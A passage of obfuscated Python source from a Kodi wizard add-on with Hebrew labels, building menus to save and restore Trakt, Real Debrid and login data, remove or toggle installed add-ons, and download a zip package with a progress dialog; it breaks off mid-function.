	addFile ('%s שמירת הגדרות סאונד ורזולוציה:  '%O0OOO0O0O0O0OOOOO .replace ('true',O0OOO0OO00OO00OO0 ).replace ('false',O00O0O00OOO0OOOOO ),'togglesetting','keepsound',icon =ICONTRAKT ,themeit =THEME1 )#line:3158
	addFile ('%s שמירת הגדרות בסקין :צבעים\תצוגות מדיה  : '%OO00O0OOOOOOOOOO0 .replace ('true',O0OOO0OO00OO00OO0 ).replace ('false',O00O0O00OOO0OOOOO ),'togglesetting','keepview',icon =ICONTRAKT ,themeit =THEME1 )#line:3160
	addFile ('%s שמירת פליליסט לאודר:  '%O0OOO0O000OOOO0O0 .replace ('true',O0OOO0OO00OO00OO0 ).replace ('false',O00O0O00OOO0OOOOO ),'togglesetting','keepplaylist',icon =ICONTRAKT ,themeit =THEME1 )#line:3161
	addFile ('%s שמירת הגדרות באפר: '%OOOOO00OOO0O0000O .replace ('true',O0OOO0OO00OO00OO0 ).replace ('false',O00O0O00OOO0OOOOO ),'togglesetting','keepadvanced',icon =ICONSAVE ,themeit =THEME1 )#line:3166
	addFile ('%s שמירת רשימות ריפו:  '%O000OOOOOO000O00O .replace ('true',O0OOO0OO00OO00OO0 ).replace ('false',O00O0O00OOO0OOOOO ),'togglesetting','keeprepos',icon =ICONSAVE ,themeit =THEME1 )#line:3168
	setView ('files','viewType')#line:3170
def traktMenu ():#line:3172
	OO0O000O00O0OO00O ='[COLOR green]מופעל[/COLOR]'if KEEPTRAKT =='true'else '[COLOR red]מבוטל[/COLOR]'#line:3173
	O0000OO00OOO0OOOO =str (TRAKTSAVE )if not TRAKTSAVE ==''else 'Trakt hasnt been saved yet.'#line:3174
	addFile ('[I]Register FREE Account at http://trakt.tv[/I]','',icon =ICONTRAKT ,themeit =THEME3 )#line:3175
	addFile ('Save Trakt Data: %s'%OO0O000O00O0OO00O ,'togglesetting','keeptrakt',icon =ICONTRAKT ,themeit =THEME3 )#line:3176
	if KEEPTRAKT =='true':addFile ('Last Save: %s'%str (O0000OO00OOO0OOOO ),'',icon =ICONTRAKT ,themeit =THEME3 )#line:3177
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONTRAKT ,themeit =THEME3 )#line:3178
	for OO0O000O00O0OO00O in traktit .ORDER :#line:3180
		O00O0O0OOO0OO0O00 =TRAKTID [OO0O000O00O0OO00O ]['name']#line:3181
		O00OOOO0OO0O00OO0 =TRAKTID [OO0O000O00O0OO00O ]['path']#line:3182
		O00OO0O000OOO00O0 =TRAKTID [OO0O000O00O0OO00O ]['saved']#line:3183
		OOOO0OO00OO000OO0 =TRAKTID [OO0O000O00O0OO00O ]['file']#line:3184
		OO0OOO0O00000OO00 =wiz .getS (O00OO0O000OOO00O0 )#line:3185
		O0000O0O0OO0OOO0O =traktit .traktUser (OO0O000O00O0OO00O )#line:3186
		OO00OOOO0000O0OOO =TRAKTID [OO0O000O00O0OO00O ]['icon']if os .path .exists (O00OOOO0OO0O00OO0 )else ICONTRAKT #line:3187
		OOOOOOO00OOO0O00O =TRAKTID [OO0O000O00O0OO00O ]['fanart']if os .path .exists (O00OOOO0OO0O00OO0 )else FANART #line:3188
		OO0O000O0OO00O000 =createMenu ('saveaddon','Trakt',OO0O000O00O0OO00O )#line:3189
		OO0OOOO00OO000000 =createMenu ('save','Trakt',OO0O000O00O0OO00O )#line:3190
		OO0O000O0OO00O000 .append ((THEME2 %'%s Settings'%O00O0O0OOO0OO0O00 ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=trakt)'%(ADDON_ID ,OO0O000O00O0OO00O )))#line:3191
		addFile ('[+]-> %s'%O00O0O0OOO0OO0O00 ,'',icon =OO00OOOO0000O0OOO ,fanart =OOOOOOO00OOO0O00O ,themeit =THEME3 )#line:3193
		if not os .path .exists (O00OOOO0OO0O00OO0 ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =OO00OOOO0000O0OOO ,fanart =OOOOOOO00OOO0O00O ,menu =OO0O000O0OO00O000 )#line:3194
		elif not O0000O0O0OO0OOO0O :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authtrakt',OO0O000O00O0OO00O ,icon =OO00OOOO0000O0OOO ,fanart =OOOOOOO00OOO0O00O ,menu =OO0O000O0OO00O000 )#line:3195
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%O0000O0O0OO0OOO0O ,'authtrakt',OO0O000O00O0OO00O ,icon =OO00OOOO0000O0OOO ,fanart =OOOOOOO00OOO0O00O ,menu =OO0O000O0OO00O000 )#line:3196
		if OO0OOO0O00000OO00 =="":#line:3197
			if os .path .exists (OOOO0OO00OO000OO0 ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importtrakt',OO0O000O00O0OO00O ,icon =OO00OOOO0000O0OOO ,fanart =OOOOOOO00OOO0O00O ,menu =OO0OOOO00OO000000 )#line:3198
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savetrakt',OO0O000O00O0OO00O ,icon =OO00OOOO0000O0OOO ,fanart =OOOOOOO00OOO0O00O ,menu =OO0OOOO00OO000000 )#line:3199
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%OO0OOO0O00000OO00 ,'',icon =OO00OOOO0000O0OOO ,fanart =OOOOOOO00OOO0O00O ,menu =OO0OOOO00OO000000 )#line:3200
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3202
	addFile ('Save All Trakt Data','savetrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3203
	addFile ('Recover All Saved Trakt Data','restoretrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3204
	addFile ('Import Trakt Data','importtrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3205
	addFile ('Clear All Saved Trakt Data','cleartrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3206
	addFile ('Clear All Addon Data','addontrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3207
	setView ('files','viewType')#line:3208
def realMenu ():#line:3210
	O0000OO0OO0O0000O ='[COLOR green]ON[/COLOR]'if KEEPREAL =='true'else '[COLOR red]OFF[/COLOR]'#line:3211
	O0OO000O0OOO0O0O0 =str (REALSAVE )if not REALSAVE ==''else 'Real Debrid hasnt been saved yet.'#line:3212
	addFile ('[I]http://real-debrid.com is a PAID service.[/I]','',icon =ICONREAL ,themeit =THEME3 )#line:3213
	addFile ('Save Real Debrid Data: %s'%O0000OO0OO0O0000O ,'togglesetting','keepdebrid',icon =ICONREAL ,themeit =THEME3 )#line:3214
	if KEEPREAL =='true':addFile ('Last Save: %s'%str (O0OO000O0OOO0O0O0 ),'',icon =ICONREAL ,themeit =THEME3 )#line:3215
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONREAL ,themeit =THEME3 )#line:3216
	for O00OOOOOOOOOOOOO0 in debridit .ORDER :#line:3218
		O0OOOO0O0O000O0O0 =DEBRIDID [O00OOOOOOOOOOOOO0 ]['name']#line:3219
		OO0O00O0OO00OOOOO =DEBRIDID [O00OOOOOOOOOOOOO0 ]['path']#line:3220
		O00OO0O0OO00OO0O0 =DEBRIDID [O00OOOOOOOOOOOOO0 ]['saved']#line:3221
		OOO0O0000OOO00000 =DEBRIDID [O00OOOOOOOOOOOOO0 ]['file']#line:3222
		OO0OOO00O0O000000 =wiz .getS (O00OO0O0OO00OO0O0 )#line:3223
		O00O0OO0000O0OO0O =debridit .debridUser (O00OOOOOOOOOOOOO0 )#line:3224
		OOO0OOOO0O0OOO000 =DEBRIDID [O00OOOOOOOOOOOOO0 ]['icon']if os .path .exists (OO0O00O0OO00OOOOO )else ICONREAL #line:3225
		OO0O000O00O00O000 =DEBRIDID [O00OOOOOOOOOOOOO0 ]['fanart']if os .path .exists (OO0O00O0OO00OOOOO )else FANART #line:3226
		O0OO0O000O000OOOO =createMenu ('saveaddon','Debrid',O00OOOOOOOOOOOOO0 )#line:3227
		O0OOO000OO00000OO =createMenu ('save','Debrid',O00OOOOOOOOOOOOO0 )#line:3228
		O0OO0O000O000OOOO .append ((THEME2 %'%s Settings'%O0OOOO0O0O000O0O0 ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=debrid)'%(ADDON_ID ,O00OOOOOOOOOOOOO0 )))#line:3229
		addFile ('[+]-> %s'%O0OOOO0O0O000O0O0 ,'',icon =OOO0OOOO0O0OOO000 ,fanart =OO0O000O00O00O000 ,themeit =THEME3 )#line:3231
		if not os .path .exists (OO0O00O0OO00OOOOO ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =OOO0OOOO0O0OOO000 ,fanart =OO0O000O00O00O000 ,menu =O0OO0O000O000OOOO )#line:3232
		elif not O00O0OO0000O0OO0O :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authdebrid',O00OOOOOOOOOOOOO0 ,icon =OOO0OOOO0O0OOO000 ,fanart =OO0O000O00O00O000 ,menu =O0OO0O000O000OOOO )#line:3233
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%O00O0OO0000O0OO0O ,'authdebrid',O00OOOOOOOOOOOOO0 ,icon =OOO0OOOO0O0OOO000 ,fanart =OO0O000O00O00O000 ,menu =O0OO0O000O000OOOO )#line:3234
		if OO0OOO00O0O000000 =="":#line:3235
			if os .path .exists (OOO0O0000OOO00000 ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importdebrid',O00OOOOOOOOOOOOO0 ,icon =OOO0OOOO0O0OOO000 ,fanart =OO0O000O00O00O000 ,menu =O0OOO000OO00000OO )#line:3236
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savedebrid',O00OOOOOOOOOOOOO0 ,icon =OOO0OOOO0O0OOO000 ,fanart =OO0O000O00O00O000 ,menu =O0OOO000OO00000OO )#line:3237
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%OO0OOO00O0O000000 ,'',icon =OOO0OOOO0O0OOO000 ,fanart =OO0O000O00O00O000 ,menu =O0OOO000OO00000OO )#line:3238
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3240
	addFile ('Save All Real Debrid Data','savedebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3241
	addFile ('Recover All Saved Real Debrid Data','restoredebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3242
	addFile ('Import Real Debrid Data','importdebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3243
	addFile ('Clear All Saved Real Debrid Data','cleardebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3244
	addFile ('Clear All Addon Data','addondebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3245
	setView ('files','viewType')#line:3246
def loginMenu ():#line:3248
	O00O0O000O00OOO00 ='[COLOR green]ON[/COLOR]'if KEEPLOGIN =='true'else '[COLOR red]OFF[/COLOR]'#line:3249
	OOO0O0OO0OOO0OOO0 =str (LOGINSAVE )if not LOGINSAVE ==''else 'Login data hasnt been saved yet.'#line:3250
	addFile ('[I]Several of these addons are PAID services.[/I]','',icon =ICONLOGIN ,themeit =THEME3 )#line:3251
	addFile ('Save Login Data: %s'%O00O0O000O00OOO00 ,'togglesetting','keeplogin',icon =ICONLOGIN ,themeit =THEME3 )#line:3252
	if KEEPLOGIN =='true':addFile ('Last Save: %s'%str (OOO0O0OO0OOO0OOO0 ),'',icon =ICONLOGIN ,themeit =THEME3 )#line:3253
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONLOGIN ,themeit =THEME3 )#line:3254
	for O00O0O000O00OOO00 in loginit .ORDER :#line:3256
		O0OO0O00OOO000O00 =LOGINID [O00O0O000O00OOO00 ]['name']#line:3257
		OOO00OO000OO0O0O0 =LOGINID [O00O0O000O00OOO00 ]['path']#line:3258
		OO0O0OOOO0OOO0OO0 =LOGINID [O00O0O000O00OOO00 ]['saved']#line:3259
		OOO00O00O00O000OO =LOGINID [O00O0O000O00OOO00 ]['file']#line:3260
		O0O00OO0O0O00OO00 =wiz .getS (OO0O0OOOO0OOO0OO0 )#line:3261
		OO00OO0O000O0O0OO =loginit .loginUser (O00O0O000O00OOO00 )#line:3262
		OOO0OOO0OO0OOOO0O =LOGINID [O00O0O000O00OOO00 ]['icon']if os .path .exists (OOO00OO000OO0O0O0 )else ICONLOGIN #line:3263
		O0OO0O0OOO00O0000 =LOGINID [O00O0O000O00OOO00 ]['fanart']if os .path .exists (OOO00OO000OO0O0O0 )else FANART #line:3264
		O0OOO000000OO00OO =createMenu ('saveaddon','Login',O00O0O000O00OOO00 )#line:3265
		OO000000OOOO0O0OO =createMenu ('save','Login',O00O0O000O00OOO00 )#line:3266
		O0OOO000000OO00OO .append ((THEME2 %'%s Settings'%O0OO0O00OOO000O00 ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=login)'%(ADDON_ID ,O00O0O000O00OOO00 )))#line:3267
		addFile ('[+]-> %s'%O0OO0O00OOO000O00 ,'',icon =OOO0OOO0OO0OOOO0O ,fanart =O0OO0O0OOO00O0000 ,themeit =THEME3 )#line:3269
		if not os .path .exists (OOO00OO000OO0O0O0 ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =OOO0OOO0OO0OOOO0O ,fanart =O0OO0O0OOO00O0000 ,menu =O0OOO000000OO00OO )#line:3270
		elif not OO00OO0O000O0O0OO :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authlogin',O00O0O000O00OOO00 ,icon =OOO0OOO0OO0OOOO0O ,fanart =O0OO0O0OOO00O0000 ,menu =O0OOO000000OO00OO )#line:3271
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%OO00OO0O000O0O0OO ,'authlogin',O00O0O000O00OOO00 ,icon =OOO0OOO0OO0OOOO0O ,fanart =O0OO0O0OOO00O0000 ,menu =O0OOO000000OO00OO )#line:3272
		if O0O00OO0O0O00OO00 =="":#line:3273
			if os .path .exists (OOO00O00O00O000OO ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importlogin',O00O0O000O00OOO00 ,icon =OOO0OOO0OO0OOOO0O ,fanart =O0OO0O0OOO00O0000 ,menu =OO000000OOOO0O0OO )#line:3274
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savelogin',O00O0O000O00OOO00 ,icon =OOO0OOO0OO0OOOO0O ,fanart =O0OO0O0OOO00O0000 ,menu =OO000000OOOO0O0OO )#line:3275
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%O0O00OO0O0O00OO00 ,'',icon =OOO0OOO0OO0OOOO0O ,fanart =O0OO0O0OOO00O0000 ,menu =OO000000OOOO0O0OO )#line:3276
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3278
	addFile ('Save All Login Data','savelogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3279
	addFile ('Recover All Saved Login Data','restorelogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3280
	addFile ('Import Login Data','importlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3281
	addFile ('Clear All Saved Login Data','clearlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3282
	addFile ('Clear All Addon Data','addonlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3283
	setView ('files','viewType')#line:3284
def fixUpdate ():#line:3286
	if KODIV <17 :#line:3287
		O000OOO0OO0OOO00O =os .path .join (DATABASE ,wiz .latestDB ('Addons'))#line:3288
		try :#line:3289
			os .remove (O000OOO0OO0OOO00O )#line:3290
		except Exception as O00OO0O0O00O00O00 :#line:3291
			wiz .log ("Unable to remove %s, Purging DB"%O000OOO0OO0OOO00O )#line:3292
			wiz .purgeDb (O000OOO0OO0OOO00O )#line:3293
	else :#line:3294
		xbmc .log ("Requested Addons.db be removed but doesnt work in Kod17")#line:3295
def removeAddonMenu ():#line:3297
	OO0OO000OO00000O0 =glob .glob (os .path .join (ADDONS ,'*/'))#line:3298
	OO000OO0OOO00000O =[];O0O0000OO0000OO00 =[]#line:3299
	for OO0OO00OO000OO000 in sorted (OO0OO000OO00000O0 ,key =lambda O0000OO00OO0O0O00 :O0000OO00OO0O0O00 ):#line:3300
		O0OOOO000O0O0OO00 =os .path .split (OO0OO00OO000OO000 [:-1 ])[1 ]#line:3301
		if O0OOOO000O0O0OO00 in EXCLUDES :continue #line:3302
		elif O0OOOO000O0O0OO00 in DEFAULTPLUGINS :continue #line:3303
		elif O0OOOO000O0O0OO00 =='packages':continue #line:3304
		OO0OOOOOO00O000OO =os .path .join (OO0OO00OO000OO000 ,'addon.xml')#line:3305
		if os .path .exists (OO0OOOOOO00O000OO ):#line:3306
			OOOOO000000OOO000 =open (OO0OOOOOO00O000OO )#line:3307
			O000O000O0O0O0O0O =OOOOO000000OOO000 .read ()#line:3308
			O0O0O00O0000O0000 =wiz .parseDOM (O000O000O0O0O0O0O ,'addon',ret ='id')#line:3309
			OO0O000OO00O00000 =O0OOOO000O0O0OO00 if len (O0O0O00O0000O0000 )==0 else O0O0O00O0000O0000 [0 ]#line:3311
			try :#line:3312
				O0OO0000O0OO0O00O =xbmcaddon .Addon (id =OO0O000OO00O00000 )#line:3313
				OO000OO0OOO00000O .append (O0OO0000O0OO0O00O .getAddonInfo ('name'))#line:3314
				O0O0000OO0000OO00 .append (OO0O000OO00O00000 )#line:3315
			except :#line:3316
				pass #line:3317
	if len (OO000OO0OOO00000O )==0 :#line:3318
		wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]No Addons To Remove[/COLOR]"%COLOR2 )#line:3319
		return #line:3320
	if KODIV >16 :#line:3321
		O00O00OOOOO00O0OO =DIALOG .multiselect ("%s: Select the addons you wish to remove."%ADDONTITLE ,OO000OO0OOO00000O )#line:3322
	else :#line:3323
		O00O00OOOOO00O0OO =[];OO000O0O0O0OO0O0O =0 #line:3324
		O000OO00O00OO00O0 =["-- Click here to Continue --"]+OO000OO0OOO00000O #line:3325
		while not OO000O0O0O0OO0O0O ==-1 :#line:3326
			OO000O0O0O0OO0O0O =DIALOG .select ("%s: Select the addons you wish to remove."%ADDONTITLE ,O000OO00O00OO00O0 )#line:3327
			if OO000O0O0O0OO0O0O ==-1 :break #line:3328
			elif OO000O0O0O0OO0O0O ==0 :break #line:3329
			else :#line:3330
				O00O00000000000O0 =(OO000O0O0O0OO0O0O -1 )#line:3331
				if O00O00000000000O0 in O00O00OOOOO00O0OO :#line:3332
					O00O00OOOOO00O0OO .remove (O00O00000000000O0 )#line:3333
					O000OO00O00OO00O0 [OO000O0O0O0OO0O0O ]=OO000OO0OOO00000O [O00O00000000000O0 ]#line:3334
				else :#line:3335
					O00O00OOOOO00O0OO .append (O00O00000000000O0 )#line:3336
					O000OO00O00OO00O0 [OO000O0O0O0OO0O0O ]="[B][COLOR %s]%s[/COLOR][/B]"%(COLOR1 ,OO000OO0OOO00000O [O00O00000000000O0 ])#line:3337
	if O00O00OOOOO00O0OO ==None :return #line:3338
	if len (O00O00OOOOO00O0OO )>0 :#line:3339
		wiz .addonUpdates ('set')#line:3340
		for O0O0O000OO0OOO0OO in O00O00OOOOO00O0OO :#line:3341
			removeAddon (O0O0000OO0000OO00 [O0O0O000OO0OOO0OO ],OO000OO0OOO00000O [O0O0O000OO0OOO0OO ],True )#line:3342
		xbmc .sleep (1000 )#line:3344
		if INSTALLMETHOD ==1 :OOOO0000OOO00OOOO =1 #line:3346
		elif INSTALLMETHOD ==2 :OOOO0000OOO00OOOO =0 #line:3347
		else :OOOO0000OOO00OOOO =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]סיום התקנה [COLOR %s]סגירה[/COLOR] או [COLOR %s]הצג נתונים[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR green]הצג נתונים[/COLOR][/B]",nolabel ="[B][COLOR red]סגירה[/COLOR][/B]")#line:3348
		if OOOO0000OOO00OOOO ==1 :wiz .reloadFix ('remove addon')#line:3349
		else :wiz .addonUpdates ('reset');wiz .killxbmc (True )#line:3350
def removeAddonDataMenu ():#line:3352
	if os .path .exists (ADDOND ):#line:3353
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Addon_Data','removedata','all',themeit =THEME2 )#line:3354
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Addon_Data for Uninstalled Addons','removedata','uninstalled',themeit =THEME2 )#line:3355
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Empty Folders in Addon_Data','removedata','empty',themeit =THEME2 )#line:3356
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] %s Addon_Data'%ADDONTITLE ,'resetaddon',themeit =THEME2 )#line:3357
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3358
		O0O0O0O0OO00OOOOO =glob .glob (os .path .join (ADDOND ,'*/'))#line:3359
		for OOO00000O0O0OOOO0 in sorted (O0O0O0O0OO00OOOOO ,key =lambda O0O0OOO0O0OOOO00O :O0O0OOO0O0OOOO00O ):#line:3360
			O000OOO000O00OO00 =OOO00000O0O0OOOO0 .replace (ADDOND ,'').replace ('\\','').replace ('/','')#line:3361
			OOO0OOO0OO00000O0 =os .path .join (OOO00000O0O0OOOO0 .replace (ADDOND ,ADDONS ),'icon.png')#line:3362
			OO000O0OO00OOOOO0 =os .path .join (OOO00000O0O0OOOO0 .replace (ADDOND ,ADDONS ),'fanart.png')#line:3363
			O000O000OO0000O0O =O000OOO000O00OO00 #line:3364
			O0000O0OOO00000OO ={'audio.':'[COLOR orange][AUDIO] [/COLOR]','metadata.':'[COLOR cyan][METADATA] [/COLOR]','module.':'[COLOR orange][MODULE] [/COLOR]','plugin.':'[COLOR blue][PLUGIN] [/COLOR]','program.':'[COLOR orange][PROGRAM] [/COLOR]','repository.':'[COLOR gold][REPO] [/COLOR]','script.':'[COLOR green][SCRIPT] [/COLOR]','service.':'[COLOR green][SERVICE] [/COLOR]','skin.':'[COLOR dodgerblue][SKIN] [/COLOR]','video.':'[COLOR orange][VIDEO] [/COLOR]','weather.':'[COLOR yellow][WEATHER] [/COLOR]'}#line:3365
			for O000O0OOO0O0000OO in O0000O0OOO00000OO :#line:3366
				O000O000OO0000O0O =O000O000OO0000O0O .replace (O000O0OOO0O0000OO ,O0000O0OOO00000OO [O000O0OOO0O0000OO ])#line:3367
			if O000OOO000O00OO00 in EXCLUDES :O000O000OO0000O0O ='[COLOR green][B][PROTECTED][/B][/COLOR] %s'%O000O000OO0000O0O #line:3368
			else :O000O000OO0000O0O ='[COLOR red][B][REMOVE][/B][/COLOR] %s'%O000O000OO0000O0O #line:3369
			addFile (' %s'%O000O000OO0000O0O ,'removedata',O000OOO000O00OO00 ,icon =OOO0OOO0OO00000O0 ,fanart =OO000O0OO00OOOOO0 ,themeit =THEME2 )#line:3370
	else :#line:3371
		addFile ('No Addon data folder found.','',themeit =THEME3 )#line:3372
	setView ('files','viewType')#line:3373
def enableAddons ():#line:3375
	addFile ("[I][B][COLOR red]!!Notice: Disabling Some Addons Can Cause Issues!![/COLOR][/B][/I]",'',icon =ICONMAINT )#line:3376
	O00O0O0000O0O0OO0 =glob .glob (os .path .join (ADDONS ,'*/'))#line:3377
	O0O0O00O00O00OOOO =0 #line:3378
	for O0O0OO0O0OO0OO000 in sorted (O00O0O0000O0O0OO0 ,key =lambda OOO000O0000O00O00 :OOO000O0000O00O00 ):#line:3379
		OOOO0O0O0O0OO0O0O =os .path .split (O0O0OO0O0OO0OO000 [:-1 ])[1 ]#line:3380
		if OOOO0O0O0O0OO0O0O in EXCLUDES :continue #line:3381
		if OOOO0O0O0O0OO0O0O in DEFAULTPLUGINS :continue #line:3382
		OOO0O0O00O00OO000 =os .path .join (O0O0OO0O0OO0OO000 ,'addon.xml')#line:3383
		if os .path .exists (OOO0O0O00O00OO000 ):#line:3384
			O0O0O00O00O00OOOO +=1 #line:3385
			O00O0O0000O0O0OO0 =O0O0OO0O0OO0OO000 .replace (ADDONS ,'')[1 :-1 ]#line:3386
			OO0O0O00OOOOOOO0O =open (OOO0O0O00O00OO000 )#line:3387
			O0O0000O0000000O0 =OO0O0O00OOOOOOO0O .read ().replace ('\n','').replace ('\r','').replace ('\t','')#line:3388
			OOO000OO0000O0O00 =wiz .parseDOM (O0O0000O0000000O0 ,'addon',ret ='id')#line:3389
			OOO0O0OOOO0OOOO0O =wiz .parseDOM (O0O0000O0000000O0 ,'addon',ret ='name')#line:3390
			try :#line:3391
				OOO0O0OOO0O00000O =OOO000OO0000O0O00 [0 ]#line:3392
				O000OO0O0O000O0OO =OOO0O0OOOO0OOOO0O [0 ]#line:3393
			except :#line:3394
				continue #line:3395
			try :#line:3396
				O0O000OO0O00OOO0O =xbmcaddon .Addon (id =OOO0O0OOO0O00000O )#line:3397
				OO00000OO0000O0O0 ="[COLOR green][Enabled][/COLOR]"#line:3398
				OO00OO0O00OOOO00O ="false"#line:3399
			except :#line:3400
				OO00000OO0000O0O0 ="[COLOR red][Disabled][/COLOR]"#line:3401
				OO00OO0O00OOOO00O ="true"#line:3402
				pass #line:3403
			O0O00O0O00OO000O0 =os .path .join (O0O0OO0O0OO0OO000 ,'icon.png')if os .path .exists (os .path .join (O0O0OO0O0OO0OO000 ,'icon.png'))else ICON #line:3404
			O00OO000O00OO000O =os .path .join (O0O0OO0O0OO0OO000 ,'fanart.jpg')if os .path .exists (os .path .join (O0O0OO0O0OO0OO000 ,'fanart.jpg'))else FANART #line:3405
			addFile ("%s %s"%(OO00000OO0000O0O0 ,O000OO0O0O000O0OO ),'toggleaddon',O00O0O0000O0O0OO0 ,OO00OO0O00OOOO00O ,icon =O0O00O0O00OO000O0 ,fanart =O00OO000O00OO000O )#line:3406
			OO0O0O00OOOOOOO0O .close ()#line:3407
	if O0O0O00O00O00OOOO ==0 :#line:3408
		addFile ("No Addons Found to Enable or Disable.",'',icon =ICONMAINT )#line:3409
	setView ('files','viewType')#line:3410
def changeFeq ():#line:3412
	OO000OOO0O0OO0O0O =['Every Startup','Every Day','Every Three Days','Every Weekly']#line:3413
	OO00OO00000O0O000 =DIALOG .select ("[COLOR %s]How often would you list to Auto Clean on Startup?[/COLOR]"%COLOR2 ,OO000OOO0O0OO0O0O )#line:3414
	if not OO00OO00000O0O000 ==-1 :#line:3415
		wiz .setS ('autocleanfeq',str (OO00OO00000O0O000 ))#line:3416
		wiz .LogNotify ('[COLOR %s]Auto Clean Up[/COLOR]'%COLOR1 ,'[COLOR %s]Fequency Now %s[/COLOR]'%(COLOR2 ,OO000OOO0O0OO0O0O [OO00OO00000O0O000 ]))#line:3417
def developer ():#line:3419
	addFile ('Convert Text Files to 0.1.7','converttext',themeit =THEME1 )#line:3420
	addFile ('Create QR Code','createqr',themeit =THEME1 )#line:3421
	addFile ('Test Notifications','testnotify',themeit =THEME1 )#line:3422
	addFile ('Test Update','testupdate',themeit =THEME1 )#line:3423
	addFile ('Test First Run','testfirst',themeit =THEME1 )#line:3424
	addFile ('Test First Run Settings','testfirstrun',themeit =THEME1 )#line:3425
	addFile ('Test APk','testapk',themeit =THEME1 )#line:3426
	setView ('files','viewType')#line:3428
def download (OOO00O00O00O0OOOO ,OOO0O00O0OO0000O0 ):#line:3433
  OOO0O00O0O000OO00 =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:3434
  O000O0O00OOO0O0OO =xbmcgui .DialogProgress ()#line:3435
  O000O0O00OOO0O0OO .create ("XBMC ISRAEL","Downloading "+name ,'','Please Wait')#line:3436
  OOOO00OOOOO00000O =os .path .join (OOO0O00O0O000OO00 ,'isr.zip')#line:3437
  O00OOOO0OO0OOO00O =urllib2 .Request (OOO00O00O00O0OOOO )#line:3438
  OO00O00O0000O0000 =urllib2 .urlopen (O00OOOO0OO0OOO00O )#line:3439
  OO00OO00OOO0O00O0 =xbmcgui .DialogProgress ()#line:3441
  OO00OO00OOO0O00O0 .create ("Downloading","Downloading "+name )#line:3442
  OO00OO00OOO0O00O0 .update (0 )#line:3443
  OO0O00O0O00O000OO =OOO0O00O0OO0000O0 #line:3444
  OO00O0O0O0OOO0O0O =open (OOOO00OOOOO00000O ,'wb')#line:3445
  try :#line:3447
    OOOO00OO0O0OOO000 =OO00O00O0000O0000 .info ().getheader ('Content-Length').strip ()#line:3448
    O00000O000000OOO0 =True #line:3449
  except AttributeError :#line:3450
        O00000O000000OOO0 =False #line:3451
  if O00000O000000OOO0 :#line:3453
        OOOO00OO0O0OOO000 =int (OOOO00OO0O0OOO000 )#line:3454
  O0OO00OO00OOO0OOO =0 #line:3456
  OO000O0OO0O0OOO00 =time .time ()#line:3457
  while True :#line:3458
        OOO0OO00O00O00OOO =OO00O00O0000O0000 .read (8192 )#line:3459
        if not OOO0OO00O00O00OOO :#line:3460
            sys .stdout .write ('\n')#line:3461
            break #line:3462
        O0OO00OO00OOO0OOO +=len (OOO0OO00O00O00OOO )#line:3464
        OO00O0O0O0OOO0O0O .write (OOO0OO00O00O00OOO )#line:3465
        if not O00000O000000OOO0 :#line:3467
            OOOO00OO0O0OOO000 =O0OO00OO00OOO0OOO #line:3468
        if OO00OO00OOO0O00O0 .iscanceled ():#line:3469
           OO00OO00OOO0O00O0 .close ()#line:3470
           try :#line:3471
            os .remove (OOOO00OOOOO00000O )#line:3472
           except :#line:3473
            pass #line:3474
           break #line:3475
        O00OO0OOOOOO000OO =float (O0OO00OO00OOO0OOO )/OOOO00OO0O0OOO000 #line:3476
        O00OO0OOOOOO000OO =round (O00OO0OOOOOO000OO *100 ,2 )#line:3477
        OOO0O00OO00O0OO00 =O0OO00OO00OOO0OOO /(1024 *1024 )#line:3478
